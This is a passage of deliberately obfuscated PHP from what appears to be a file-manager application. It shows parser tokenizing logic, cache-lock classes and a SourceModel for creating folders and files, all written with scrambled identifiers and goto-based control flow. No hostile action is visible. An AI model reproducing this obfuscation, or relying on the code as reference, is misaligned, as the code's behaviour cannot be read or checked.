substr($fŠ°½Åº«, $e²Ááºà®, 256), $EùˆÕÎê®İ); if (1 == $c¥öÍõÖÄœ) { $d“„‡Ïõ¹ = $EùˆÕÎê®İ[1]; $e²Ááºà® += strlen($d“„‡Ïõ¹); } break; case $F¸ïÏâ“Ú¾[252]: case $F¸ïÏâ“Ú¾[822]: $cßÅ––á‚´ = $Cƒ±…ÆÁ‚; ++$e²Ááºà®; $DÄº¹ŸÇì¯ = $e²Ááºà®; if ($F¸ïÏâ“Ú¾[252] == $Cƒ±…ÆÁ‚) { $BŞ¿¸Ë°» = 1; while ($BŞ¿¸Ë°» > 0) { if (!isset($fŠ°½Åº«[$DÄº¹ŸÇì¯])) { break; } $Fº‹ìæÁà = $fŠ°½Åº«[$DÄº¹ŸÇì¯]; switch ($Fº‹ìæÁà) { case $F¸ïÏâ“Ú¾[93]: ++$DÄº¹ŸÇì¯; break; case $F¸ïÏâ“Ú¾[252]: ++$BŞ¿¸Ë°»; break; case $F¸ïÏâ“Ú¾[822]: --$BŞ¿¸Ë°»; break; } ++$DÄº¹ŸÇì¯; } $d“„‡Ïõ¹ = substr($fŠ°½Åº«, $e²Ááºà®, $DÄº¹ŸÇì¯ - $e²Ááºà® - 1); $e²Ááºà® = $DÄº¹ŸÇì¯; } break; case $F¸ïÏâ“Ú¾[157]: case $F¸ïÏâ“Ú¾[489]: $cßÅ––á‚´ = $Cƒ±…ÆÁ‚; ++$e²Ááºà®; if ($F¸ïÏâ“Ú¾[157] == $Cƒ±…ÆÁ‚) { $d“„‡Ïõ¹ = array(); do { $EÒÎÌ¹¸ó = $e²Ááºà®; $d¶Áò™óÔ³ = self::getRawObject($fŠ°½Åº«, $e²Ááºà®); $e²Ááºà® = $d¶Áò™óÔ³[2]; $d“„‡Ïõ¹[] = $d¶Áò™óÔ³; } while ($F¸ïÏâ“Ú¾[489] != $d¶Áò™óÔ³[0] && $e²Ááºà® != $EÒÎÌ¹¸ó); array_pop($d“„‡Ïõ¹); } break; case $F¸ïÏâ“Ú¾[928]: case $F¸ïÏâ“Ú¾[931]: if (isset($fŠ°½Åº«[$e²Ááºà® + 1]) && $fŠ°½Åº«[$e²Ááºà® + 1] == $Cƒ±…ÆÁ‚) { $cßÅ––á‚´ = $Cƒ±…ÆÁ‚ . $Cƒ±…ÆÁ‚; $e²Ááºà® += 2; if ($F¸ïÏâ“Ú¾[928] == $Cƒ±…ÆÁ‚) { $d“„‡Ïõ¹ = array(); do { $EÒÎÌ¹¸ó = $e²Ááºà®; $d¶Áò™óÔ³ = self::getRawObject($fŠ°½Åº«, $e²Ááºà®); $e²Ááºà® = $d¶Áò™óÔ³[2]; $d“„‡Ïõ¹[] = $d¶Áò™óÔ³; } while ($F¸ïÏâ“Ú¾[1600] != $d¶Áò™óÔ³[0] && $e²Ááºà® != $EÒÎÌ¹¸ó); array_pop($d“„‡Ïõ¹); } } else { $cßÅ––á‚´ = $Cƒ±…ÆÁ‚; ++$e²Ááºà®; $c¥öÍõÖÄœ = preg_match($F¸ïÏâ“Ú¾[1601], substr($fŠ°½Åº«, $e²Ááºà®), $EùˆÕÎê®İ); if ($F¸ïÏâ“Ú¾[928] == $Cƒ±…ÆÁ‚ && 1 == $c¥öÍõÖÄœ) { $d“„‡Ïõ¹ = strtr($EùˆÕÎê®İ[1], $F¸ïÏâ“Ú¾[1602], $F¸ïÏâ“Ú¾[33]); $e²Ááºà® += \strlen($EùˆÕÎê®İ[0]); } elseif (!1 !== ($b†¤‡É = strpos($fŠ°½Åº«, $F¸ïÏâ“Ú¾[931], $e²Ááºà®))) { $e²Ááºà® = $b†¤‡É + 1; } } break; default: if ($F¸ïÏâ“Ú¾[1603] == substr($fŠ°½Åº«, $e²Ááºà®, 6)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1603]; $e²Ááºà® += 6; } elseif ($F¸ïÏâ“Ú¾[99] == substr($fŠ°½Åº«, $e²Ááºà®, 4)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[99]; $e²Ááºà® += 4; $d“„‡Ïõ¹ = $F¸ïÏâ“Ú¾[99]; } elseif ($F¸ïÏâ“Ú¾[1604] == substr($fŠ°½Åº«, $e²Ááºà®, 4)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1605]; $e²Ááºà® += 4; $d“„‡Ïõ¹ = $F¸ïÏâ“Ú¾[1604]; } elseif ($F¸ïÏâ“Ú¾[1606] == substr($fŠ°½Åº«, $e²Ááºà®, 5)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1605]; $e²Ááºà® += 5; $d“„‡Ïõ¹ = $F¸ïÏâ“Ú¾[1606]; } elseif ($F¸ïÏâ“Ú¾[1607] == substr($fŠ°½Åº«, $e²Ááºà®, 6)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1607]; $e²Ááºà® += 6; if (1 == preg_match($F¸ïÏâ“Ú¾[1608], substr($fŠ°½Åº«, $e²Ááºà®), $EùˆÕÎê®İ)) { $e²Ááºà® += strlen($EùˆÕÎê®İ[0]); $BôâÀ¿¹§µ = $F¸ïÏâ“Ú¾[1609]; $c¥öÍõÖÄœ = preg_match($BôâÀ¿¹§µ, substr($fŠ°½Åº«, $e²Ááºà®), $EùˆÕÎê®İ, PREG_OFFSET_CAPTURE); if (1 == $c¥öÍõÖÄœ) { $d“„‡Ïõ¹ = substr($fŠ°½Åº«, $e²Ááºà®, $EùˆÕÎê®İ[0][1]); $e²Ááºà® += $EùˆÕÎê®İ[1][1]; } } } elseif ($F¸ïÏâ“Ú¾[1610] == substr($fŠ°½Åº«, $e²Ááºà®, 9)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1610]; $e²Ááºà® += 9; } elseif (1 == preg_match($F¸ïÏâ“Ú¾[1611], substr($fŠ°½Åº«, $e²Ááºà®, 33), $EùˆÕÎê®İ)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1573]; $e²Ááºà® += strlen($EùˆÕÎê®İ[0]); $d“„‡Ïõ¹ = intval($EùˆÕÎê®İ[1]) . $F¸ïÏâ“Ú¾[70] . intval($EùˆÕÎê®İ[2]); } elseif (1 == preg_match($F¸ïÏâ“Ú¾[1612], substr($fŠ°½Åº«, $e²Ááºà®, 33), $EùˆÕÎê®İ)) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1613]; $d“„‡Ïõ¹ = intval($EùˆÕÎê®İ[1]) . $F¸ïÏâ“Ú¾[70] . intval($EùˆÕÎê®İ[2]); $e²Ááºà® += strlen($EùˆÕÎê®İ[0]); } elseif (($cŒ¨§æÂ = strspn($fŠ°½Åº«, $F¸ïÏâ“Ú¾[1614], $e²Ááºà®)) > 0) { $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[1615]; $d“„‡Ïõ¹ = substr($fŠ°½Åº«, $e²Ááºà®, $cŒ¨§æÂ); $e²Ááºà® += $cŒ¨§æÂ; } break; } goto a¿¿öã¤…±; eö´‘°÷Àò: } } goto FŸ…³ÇØÍ; D†‹ÙŞÀ : class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $c‰‡ÛŠÆµÒ =& $_SERVER[‡’¶øåüç˜]; $B‰õ‰Í¾²ó = $GLOBALS[$c‰‡ÛŠÆµÒ[6]][$c‰‡ÛŠÆµÒ[341]]; self::$cachePath = $B‰õ‰Í¾²ó[$c‰‡ÛŠÆµÒ[171]][$c‰‡ÛŠÆµÒ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($e´İ‚ÙŒèö, $aëÆµæÉƒŒ = 0) { goto E¥óö›Õ—ˆ; b¦¸í‡¼í: $AÕ‡†ê÷¬Ê = rtrim(self::$cachePath, $FÜ§Ää¨‹§[8]) . $FÜ§Ää¨‹§[783] . md5($e´İ‚ÙŒèö) . $FÜ§Ää¨‹§[780]; if (file_exists($AÕ‡†ê÷¬Ê) && filemtime($AÕ‡†ê÷¬Ê) && filemtime($AÕ‡†ê÷¬Ê) < time() - 10) { @unlink($AÕ‡†ê÷¬Ê); } do { if (file_exists($AÕ‡†ê÷¬Ê)) { cacheLockWait(); continue; } $cèå·ø†™ì = fopen($AÕ‡†ê÷¬Ê, $FÜ§Ää¨‹§[784]); if (!$cèå·ø†™ì) { return !1; } $a£‹ÓäÉ®é = flock($cèå·ø†™ì, LOCK_EX | LOCK_NB); self::$caches[$e´İ‚ÙŒèö] = array($FÜ§Ää¨‹§[785] => $cèå·ø†™ì, $FÜ§Ää¨‹§[171] => $AÕ‡†ê÷¬Ê); fwrite($cèå·ø†™ì, $A§ò¯ö‘Øâ); clearstatcache(); if ($cèå·ø†™ì && $a£‹ÓäÉ®é) { return !0; } cacheLockWait(); } while (microtime(!0) < $A§ò¯ö‘Øâ); goto aù“ìŠ¯¸©; E¥óö›Õ—ˆ: $FÜ§Ää¨‹§ =& $_SERVER[‡’¶øåüç˜]; $bÚëÁ÷ˆÁÒ = microtime(!0); $A§ò¯ö‘Øâ = $bÚëÁ÷ˆÁÒ + $aëÆµæÉƒŒ + 0.0001; goto b¦¸í‡¼í; aù“ìŠ¯¸©: $this->unlock($e´İ‚ÙŒèö); return !1; goto EÃÍ‚¶Ëİ; EÃÍ‚¶Ëİ: } public function lockGet($D¨š¤Œùè‚) { $a¨§åŠñ›­ =& $_SERVER[‡’¶øåüç˜]; $c–ğìˆ“ = rtrim(self::$cachePath, $a¨§åŠñ›­[8]) . $a¨§åŠñ›­[783] . md5($D¨š¤Œùè‚) . $a¨§åŠñ›­[780]; return file_exists($c–ğìˆ“); } public function unlock($aÜ—ø¿æëÜ) { goto EàØîæ¨Á¾; bÁŠˆ§˜Î: @flock($aèÆ•ªØì[$A×É ’Ğ£š[785]], LOCK_UN); @fclose($aèÆ•ªØì[$A×É ’Ğ£š[785]]); @unlink($aèÆ•ªØì[$A×É ’Ğ£š[171]]); goto C««¡³ª„õ; EàØîæ¨Á¾: $A×É ’Ğ£š =& $_SERVER[‡’¶øåüç˜]; $aèÆ•ªØì = self::$caches[$aÜ—ø¿æëÜ]; if (!$aèÆ•ªØì) { return; } goto bÁŠˆ§˜Î; C««¡³ª„õ: unset(self::$caches[$aÜ—ø¿æëÜ]); goto eÒ³ï‚£Å; eÒ³ï‚£Å: } } class CacheLockRedis { public function lock($dîÅó‹¬Ëâ, $E÷©‰é¹Ç¦ = 10) { $eá¾×Â²È¡ = Cache::init(); $D†¸Û®É—Œ = microtime(!0) + $E÷©‰é¹Ç¦; while (microtime(!0) < $D†¸Û®É—Œ) { $D‹ËêŒ†à = $eá¾×Â²È¡->get($dîÅó‹¬Ëâ); if (!$D‹ËêŒ†à) { $BÈ…šç = $eá¾×Â²È¡->setLock($dîÅó‹¬Ëâ, $D†¸Û®É—Œ, $E÷©‰é¹Ç¦); if ($BÈ…šç) { return !0; } } else { if ($D‹ËêŒ†à < microtime(!0)) { $eá¾×Â²È¡->set($dîÅó‹¬Ëâ, $D†¸Û®É—Œ, $D†¸Û®É—Œ); if ($eá¾×Â²È¡->get($dîÅó‹¬Ëâ) === $D‹ËêŒ†à) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($eª¤Ëâà‰õ) { return Cache::init()->get($eª¤Ëâà‰õ); } public function unlock($e÷çíâÆ“…) { return Cache::init()->remove($e÷çíâÆ“…); } } class CacheLockMemcached { public function lock($eè¯Çİµ‡¼, $fˆñĞò = 0) { $bäƒó‘è… = Cache::init(); $E‚š ß¡à¨ = microtime(!0) + $fˆñĞò; while (microtime(!0) < $E‚š ß¡à¨) { $cÃŠ¡º¦Û¢ = $bäƒó‘è…->get($eè¯Çİµ‡¼); if (!$cÃŠ¡º¦Û¢ || $cÃŠ¡º¦Û¢ < microtime(!0)) { $C’–“„ = $bäƒó‘è…->handle->add($eè¯Çİµ‡¼, $E‚š ß¡à¨, $fˆñĞò); if ($C’–“„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c…•º ƒĞ) { return Cache::init()->get($c…•º ƒĞ); } public function unlock($AÉøœ­¢Ç) { return Cache::init()->remove($AÉøœ­¢Ç); } } goto Fœé‘³Í¤; CËÓ¶™¸ ğ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($BÍ·Ã½¹ãŸ) { $D„‚‡­ÅŒÒ =& $_SERVER[‡’¶øåüç˜]; $e’óÁğ¤é = Model($D„‚‡­ÅŒÒ[487])->where(array($D„‚‡­ÅŒÒ[1434] => $BÍ·Ã½¹ãŸ))->find(); $a§°‚¹¯É = $this->_mkdirRoot(SourceModel::TYPE_USER, $BÍ·Ã½¹ãŸ, $e’óÁğ¤é[$D„‚‡­ÅŒÒ[28]]); $this->userDesktopAdd($a§°‚¹¯É); return $a§°‚¹¯É; } public function userDesktopAdd($C“éµæŸå) { $aïø”ƒî¿ê =& $_SERVER[‡’¶øåüç˜]; $eõĞ¸¦¡¿İ = LNG($aïø”ƒî¿ê[2365]); $B¡Šè¿ùîÖ = $this->mkdir($C“éµæŸå, $eõĞ¸¦¡¿İ); $this->metaSet($B¡Šè¿ùîÖ, $aïø”ƒî¿ê[2366], $aïø”ƒî¿ê[83]); $this->metaSet($C“éµæŸå, $aïø”ƒî¿ê[2367], $B¡Šè¿ùîÖ); } public function groupRootAdd($eñ°¯¼í) { $Aîí–õ¶Îë =& $_SERVER[‡’¶øåüç˜]; $e¡£ÏÖ¾Ôİ = Model($Aîí–õ¶Îë[471])->where(array($Aîí–õ¶Îë[2189] => $eñ°¯¼í))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $eñ°¯¼í, $e¡£ÏÖ¾Ôİ[$Aîí–õ¶Îë[28]]); } public function systemRootPathAdd($fÈ†Â§öï…) { if ($fÈ†Â§öï… != $_SERVER[‡’¶øåüç˜][1096]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $fÈ†Â§öï…); } public function userRootRemove($cËåÃêÁ×ò) { $dê„†±±â = $this->sourceRoot(SourceModel::TYPE_USER, $cËåÃêÁ×ò); if (!$dê„†±±â) { return; } $this->remove($dê„†±±â, !1); } public function groupRootRemove($f’ßï‚ É) { $fñœÛ»ª¢¿ = $this->sourceRoot(SourceModel::TYPE_GROUP, $f’ßï‚ É); if (!$fñœÛ»ª¢¿) { return; } $this->remove($fñœÛ»ª¢¿, !1); } private function _mkdirRoot($BàŠº‘í§ñ, $BËÏ´õ ª, $Eõà´îìØ) { goto fñÅĞöé; AÏÉ¶ÃÆ®: CacheLock::unlock($fËÎëÑİƒñ); return $E†ÌÁÕÓ×Š; goto cÁ¨½‰éŸÅ; fñÅĞöé: $b³ÜïÖˆ =& $_SERVER[‡’¶øåüç˜]; $a¯´Î„îºÌ = array($b³ÜïÖˆ[380] => 0, $b³ÜïÖˆ[534] => $BàŠº‘í§ñ, $b³ÜïÖˆ[535] => $BËÏ´õ ª, $b³ÜïÖˆ[531] => 1, $b³ÜïÖˆ[536] => USER_ID, $b³ÜïÖˆ[537] => USER_ID, $b³ÜïÖˆ[532] => $b³ÜïÖˆ[33], $b³ÜïÖˆ[538] => $b³ÜïÖˆ[483], $b³ÜïÖˆ[408] => 0, $b³ÜïÖˆ[533] => 0, $b³ÜïÖˆ[432] => 0, $b³ÜïÖˆ[539] => $b³ÜïÖˆ[33]); if ($a£Å§ª­´¥ = $this->where($a¯´Î„îºÌ)->find()) { return $a£Å§ª­´¥[$b³ÜïÖˆ[381]]; } goto fÁèË µÖ; Eê†¥§¬Ò: $E†ÌÁÕÓ×Š = $this->add($a¯´Î„îºÌ); $D±ºß£Ÿ×ó = array($b³ÜïÖˆ[540] => short_id($E†ÌÁÕÓ×Š)); $this->where(array($b³ÜïÖˆ[395] => $E†ÌÁÕÓ×Š))->save($D±ºß£Ÿ×ó); goto AÏÉ¶ÃÆ®; fÁèË µÖ: $fËÎëÑİƒñ = "\x4d\157\144\145\154\x53\x6f\x75\162\143\x65\56\155\153\x64\x69\162\x52\x6f\157\164\x2e{$BàŠº‘í§ñ}\x2e{$BËÏ´õ ª}\56" . $Eõà´îìØ; CacheLock::lock($fËÎëÑİƒñ); $a¯´Î„îºÌ[$b³ÜïÖˆ[28]] = $Eõà´îìØ; goto Eê†¥§¬Ò; cÁ¨½‰éŸÅ: } private function sourceRoot($Ağ²Áöàù, $dªïª¨Ëé, $a¨ª¬áŠ«Ã = false) { $cËóŠ†çÀâ =& $_SERVER[‡’¶øåüç˜]; $E‚ßºŠ´¦Í = array($cËóŠ†çÀâ[380] => 0, $cËóŠ†çÀâ[534] => $Ağ²Áöàù, $cËóŠ†çÀâ[535] => $dªïª¨Ëé); if ($FˆñÌÒÖŞß = $this->where($E‚ßºŠ´¦Í)->find()) { return $a¨ª¬áŠ«Ã ? $FˆñÌÒÖŞß : $FˆñÌÒÖŞß[$cËóŠ†çÀâ[381]]; } return !1; } public function sourceRootGroup($DÙÏÂ¨Ú±«) { $f–’İ—¿Ş =& $_SERVER[‡’¶øåüç˜]; if (is_string($DÙÏÂ¨Ú±«)) { $DÙÏÂ¨Ú±« = array($DÙÏÂ¨Ú±«); } $DòŞŞ´ = array($f–’İ—¿Ş[380] => 0, $f–’İ—¿Ş[534] => SourceModel::TYPE_GROUP, $f–’İ—¿Ş[535] => array($f–’İ—¿Ş[7], $DÙÏÂ¨Ú±«)); $a‰˜ğÌë¤‹ = $this->listSource($DòŞŞ´, 1000); return array_to_keyvalue($a‰˜ğÌë¤‹[$f–’İ—¿Ş[74]], $f–’İ—¿Ş[469]); } public function mkfile($eŒµÈäåÆ„, $D‚¹ø‰”èí, $Aóº¶Ğ ¶Ë = '', $D½ÉÄ”öÚ = REPEAT_RENAME) { $b§ÏÎ•ƒµ =& $_SERVER[‡’¶øåüç˜]; $eê‰ÑÅŒÌ½ = Model($b§ÏÎ•ƒµ[556])->addFileByContent($Aóº¶Ğ ¶Ë, $D‚¹ø‰”èí); return $this->_createFileCall($eŒµÈäåÆ„, $D‚¹ø‰”èí, $eê‰ÑÅŒÌ½, $D½ÉÄ”öÚ, $b§ÏÎ•ƒµ[1133]); } public function addFile($A…´Æ¼âÌ, $FñœºÄ„‰©, $C«»ÆøŠĞ, $BÄÂ‹‚‰ = false, $eÕÚ·©¿– = REPEAT_RENAME) { $a°Ôùóìó = Model($_SERVER[‡’¶øåüç˜][556])->addFile($FñœºÄ„‰©, $C«»ÆøŠĞ, $BÄÂ‹‚‰); return $this->_createFileCall($A…´Æ¼âÌ, $C«»ÆøŠĞ, $a°Ôùóìó, $eÕÚ·©¿–); } public function addFileByFileID($cÎ˜Ã‹ÂÑ‘, $A½‡™Ñ³¡ƒ, $fŠ±¹·²÷Õ, $DŒ×¸›© = REPEAT_RENAME) { $DõŠèŒ‚Ò =& $_SERVER[‡’¶øåüç˜]; $eÕ¦Ì‰¸„Â = Model($DõŠèŒ‚Ò[556])->find($A½‡™Ñ³¡ƒ); Model($DõŠèŒ‚Ò[556])->linkAdd($A½‡™Ñ³¡ƒ); return $this->_createFileCall($cÎ˜Ã‹ÂÑ‘, $fŠ±¹·²÷Õ, $eÕ¦Ì‰¸„Â, $DŒ×¸›©); } public function addFileByRemote($eæÇ¯ßÈº•, $côí…‰åİ¾, $a¿³İ´¾É•, $f²«×º½ˆÄ = array(), $A²â¦ìèµ¦ = REPEAT_RENAME) { $b ¨µÁÒÒ = Model($_SERVER[‡’¶øåüç˜][556])->addFileByRemote($côí…‰åİ¾, $a¿³İ´¾É•, $f²«×º½ˆÄ); return $this->_createFileCall($eæÇ¯ßÈº•, $a¿³İ´¾É•, $b ¨µÁÒÒ, $A²â¦ìèµ¦); } private function _createFileCall($BÛíİºËÛê, $eƒÆ‡¬âÌô, $b¥ÓÖèÉ¢†, $c†´ãë„öŞ, $EºËÊŞåÊ» = "\165\x70\154\157\141\x64") { goto eÒÄë«ÍòÙ; FĞ¦éÏ ½Ú: return $aïæ„¸²“ª; goto A„…¹ÉŠ«Ã; eÒÄë«ÍòÙ: $Eíµ—Ó¶è£ =& $_SERVER[‡’¶øåüç˜]; $c£ï°—¬… = !1; $this->lockWriteStart($BÛíİºËÛê, $eƒÆ‡¬âÌô); goto E¶î­¡´á°; E¶î­¡´á°: $aïæ„¸²“ª = $this->_createFile($BÛíİºËÛê, $eƒÆ‡¬âÌô, $b¥ÓÖèÉ¢†, $c†´ãë„öŞ, $c£ï°—¬…); if (!$c£ï°—¬…) { Model($Eíµ—Ó¶è£[434])->remove($b¥ÓÖèÉ¢†[$Eíµ—Ó¶è£[431]]); } else { if ($aïæ„¸²“ª) { Model($Eíµ—Ó¶è£[2337])->eventCreate($aïæ„¸²“ª, $EºËÊŞåÊ»); } } $this->lockWriteEnd($BÛíİºËÛê, $eƒÆ‡¬âÌô); goto FĞ¦éÏ ½Ú; A„…¹ÉŠ«Ã: } public function mkdir($Fï‡â”ÒÅİ, $Cê´çŒ‚Å©, $A–ØÚ¡œÀ = REPEAT_SKIP) { goto E£‹ùº×; e··ğ«½ë: $this->lockWriteStart($Fï‡â”ÒÅİ, $Cê´çŒ‚Å©); if ($A–ØÚ¡œÀ !== !1) { $AŒ«•á­óÚ = $this->fileNameExist($Fï‡â”ÒÅİ, $Cê´çŒ‚Å©); if ($AŒ«•á­óÚ && $A–ØÚ¡œÀ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Fï‡â”ÒÅİ, $Cê´çŒ‚Å©); return $AŒ«•á­óÚ; } $Cê´çŒ‚Å© = $this->fileNameAuto($Fï‡â”ÒÅİ, $Cê´çŒ‚Å©, $A–ØÚ¡œÀ); } $Eğ”¼¬Ò†Î = array($fÎÙôé…°à[531] => 1, $fÎÙôé…°à[398] => $Cê´çŒ‚Å©, $fÎÙôé…°à[532] => $fÎÙôé…°à[33], $fÎÙôé…°à[432] => 0, $fÎÙôé…°à[533] => 0); goto fÂíšè„ïä; A£ì´¢ ½Ï: return $bİ†×ô¬; goto BÃŸ–ŞÉŒ; E£‹ùº×: $fÎÙôé…°à =& $_SERVER[‡’¶øåüç˜]; $FÔÕŠÓ¸‰ = $this->sourceInfo($Fï‡â”ÒÅİ); if (!$FÔÕŠÓ¸‰) { return !1; } goto e··ğ«½ë; fÂíšè„ïä: $bİ†×ô¬ = $this->_addSoure($Eğ”¼¬Ò†Î, $FÔÕŠÓ¸‰); Model($fÎÙôé…°à[2337])->eventCreate($bİ†×ô¬, $fÎÙôé…°à[1134]); $this->lockWriteEnd($Fï‡â”ÒÅİ, $Cê´çŒ‚Å©); goto A£ì´¢ ½Ï; BÃŸ–ŞÉŒ: } private function _createFile($AŠˆõÏµˆ¨, $bßŒ²à™Ò¡, $aˆÖœê¥â®, $FŠä·•Œš, &$f´ÑÈŸ³Æ‘) { goto Cğ‹˜İƒ; B³½«£î¼õ: if ($FŠä·•Œš !== !1) { $Cª‡‡§ô«‘ = $this->fileNameExist($AŠˆõÏµˆ¨, $bßŒ²à™Ò¡); } $f´ÑÈŸ³Æ‘ = !0; if ($FŠä·•Œš && $Cª‡‡§ô«‘) { if ($FŠä·•Œš == REPEAT_SKIP) { $f´ÑÈŸ³Æ‘ = !1; return $Cª‡‡§ô«‘; } else { if ($FŠä·•Œš == REPEAT_REPLACE) { $dÜÖéÉ‚‰ö = $this->sourceInfo($Cª‡‡§ô«‘); $fˆÁè’³÷‰ = $this->fileHistory($dÜÖéÉ‚‰ö, $aˆÖœê¥â®[$dé¡§î–’[431]], $aˆÖœê¥â®[$dé¡§î–’[77]]); if (!$fˆÁè’³÷‰) { $f´ÑÈŸ³Æ‘ = !1; } else { $this->folderSizeReset($AŠˆõÏµˆ¨); } return $Cª‡‡§ô«‘; } else { $bßŒ²à™Ò¡ = $this->fileNameAuto($AŠˆõÏµˆ¨, $bßŒ²à™Ò¡, $FŠä·•Œš, !1); } } } goto eëƒìù¦õö; eëƒìù¦õö: $C£·øò«•Ş = array($dé¡§î–’[531] => 0, $dé¡§î–’[398] => $bßŒ²à™Ò¡, $dé¡§î–’[532] => get_path_ext($bßŒ²à™Ò¡), $dé¡§î–’[432] => $aˆÖœê¥â®[$dé¡§î–’[431]], $dé¡§î–’[533] => $aˆÖœê¥â®[$dé¡§î–’[77]]); $F‡ÀÆ¦îÙ¼ = $this->_addSoure($C£·øò«•Ş, $cñ‰´š¼í); $this->folderSizeReset($AŠˆõÏµˆ¨); goto cœ¦ñòÊ‰; cœ¦ñòÊ‰: return $F‡ÀÆ¦îÙ¼; goto aºíè‡·”İ; Cğ‹˜İƒ: $dé¡§î–’ =& $_SERVER[‡’¶øåüç˜]; $cñ‰´š¼í = $this->sourceInfo($AŠˆõÏµˆ¨); if (!$aˆÖœê¥â® || !$cñ‰´š¼í) { return !1; } goto B³½«£î¼õ; aºíè‡·”İ: } protected function fileHistory($a”½×ñŸ•‰, $e´ÑêŞ•, $e¢ÁŠÓå‘Æ) { goto b™Ÿ²çÌÆô; d˜·Ê—›Ê: return !0; goto A÷Â¾Æ»¶; cŞ•¬¶ÎÅ: Model($cã‚‡•”é“[2368])->addHistory($a”½×ñŸ•‰); $Bì›íÄåæÈ = array($cã‚‡•”é“[537] => USER_ID, $cã‚‡•”é“[402] => time(), $cã‚‡•”é“[431] => $e´ÑêŞ•, $cã‚‡•”é“[77] => $e¢ÁŠÓå‘Æ); $this->where(array($cã‚‡•”é“[395] => $a”½×ñŸ•‰[$cã‚‡•”é“[381]]))->save($Bì›íÄåæÈ); goto d˜·Ê—›Ê; b™Ÿ²çÌÆô: $cã‚‡•”é“ =& $_SERVER[‡’¶øåüç˜]; if ($a”½×ñŸ•‰[$cã‚‡•”é“[431]] == $e´ÑêŞ•) { return !1; } $this->checkLock($a”½×ñŸ•‰[$cã‚‡•”é“[381]], $e´ÑêŞ•); goto cŞ•¬¶ÎÅ; A÷Â¾Æ»¶: } public function checkLock($c¤Ğ¸Úİ˜‡, $e£ÕÖŒìó) { goto dİ¯Ãğ¦¼; bÒ„Ïä“²ê: $dåµ“»‰‘ñ = Session::get($c¬Ú¹ÁÖ‰š[2369]); $f„°ÂÅ®¶Ù = substr($C¾Ùæ´Ó[$c¬Ú¹ÁÖ‰š[28]], 0, -1 - strlen($C¾Ùæ´Ó[$c¬Ú¹ÁÖ‰š[165]])) . $c¬Ú¹ÁÖ‰š[1396] . $dåµ“»‰‘ñ . $c¬Ú¹ÁÖ‰š[91] . $C¾Ùæ´Ó[$c¬Ú¹ÁÖ‰š[165]]; $b‰¼ƒ„• = Model($c¬Ú¹ÁÖ‰š[556])->find($e£ÕÖŒìó); goto FïÑËœé; A«©Œæ„Ğà: show_json(LNG($c¬Ú¹ÁÖ‰š[2371]) . $c¬Ú¹ÁÖ‰š[2372] . LNG($c¬Ú¹ÁÖ‰š[2373]) . $c¬Ú¹ÁÖ‰š[2374] . $bã‘‡ÖĞ¿ . $c¬Ú¹ÁÖ‰š[2375], !1); goto eæ•™Ú›ÑÜ; FïÑËœé: $this->_createFileCall($C¾Ùæ´Ó[$c¬Ú¹ÁÖ‰š[474]], $f„°ÂÅ®¶Ù, $b‰¼ƒ„•, REPEAT_REPLACE, $c¬Ú¹ÁÖ‰š[1133]); $dŠàâÔ„ßÓ = $C¾Ùæ´Ó[$c¬Ú¹ÁÖ‰š[429]][$c¬Ú¹ÁÖ‰š[494]]; $bã‘‡ÖĞ¿ = $dŠàâÔ„ßÓ[$c¬Ú¹ÁÖ‰š[2370]] ? $dŠàâÔ„ßÓ[$c¬Ú¹ÁÖ‰š[2370]] : $dŠàâÔ„ßÓ[$c¬Ú¹ÁÖ‰š[28]]; goto A«©Œæ„Ğà; dİ¯Ãğ¦¼: $c¬Ú¹ÁÖ‰š =& $_SERVER[‡’¶øåüç˜]; $C¾Ùæ´Ó = $this->pathInfo($c¤Ğ¸Úİ˜‡); if (!$this->fileIsLock($C¾Ùæ´Ó, !0)) { return; } goto bÒ„Ïä“²ê; eæ•™Ú›ÑÜ: } public function fileIsLock($Añ½ÔÔ–Ğ¯, $d¼‰¦æ±ŠÜ = false) { goto fù¾Ÿ™÷Í ; B“™ˆù¯…: $aˆ£¬®¾Ú = $GLOBALS[$aÑÏ¦¸óˆ´[6]][$aÑÏ¦¸óˆ´[84]][$aÑÏ¦¸óˆ´[492]]; if ($Añ½ÔÔ–Ğ¯[$aÑÏ¦¸óˆ´[429]][$aÑÏ¦¸óˆ´[493]] <= time() - $aˆ£¬®¾Ú) { $this->metaSet($Añ½ÔÔ–Ğ¯[$aÑÏ¦¸óˆ´[381]], $aÑÏ¦¸óˆ´[491], null); $this->metaSet($Añ½ÔÔ–Ğ¯[$aÑÏ¦¸óˆ´[381]], $aÑÏ¦¸óˆ´[493], null); } if ($d¼‰¦æ±ŠÜ) { $this->metaSet($Añ½ÔÔ–Ğ¯[$aÑÏ¦¸óˆ´[381]], $aÑÏ¦¸óˆ´[493], time()); } goto cç½Ï¸¨§Ù; cç½Ï¸¨§Ù: return !1; goto d‰îÑ÷Ì‰¸; fù¾Ÿ™÷Í : $aÑÏ¦¸óˆ´ =& $_SERVER[‡’¶øåüç˜]; if (!isset($Añ½ÔÔ–Ğ¯[$aÑÏ¦¸óˆ´[429]]) || !$Añ½ÔÔ–Ğ¯[$aÑÏ¦¸óˆ´[429]][$aÑÏ¦¸óˆ´[491]]) { return !1; } if ($Añ½ÔÔ–Ğ¯[$aÑÏ¦¸óˆ´[429]][$aÑÏ¦¸óˆ´[491]] != USER_ID) { return !0; } goto B“™ˆù¯…; d‰îÑ÷Ì‰¸: } private function _addSoure($cçƒÈß¥ç, $AÏ²¥„™»°) { goto FŠ”¯µ¦²; D§ Òƒ–®: static $eŠíç‘ì î = false; if (!$eŠíç‘ì î) { Hook::trigger($aŒÚÍ’Š¡[521], $cçƒÈß¥ç); $eŠíç‘ì î = !0; } $aö®ˆªÑØÒ = 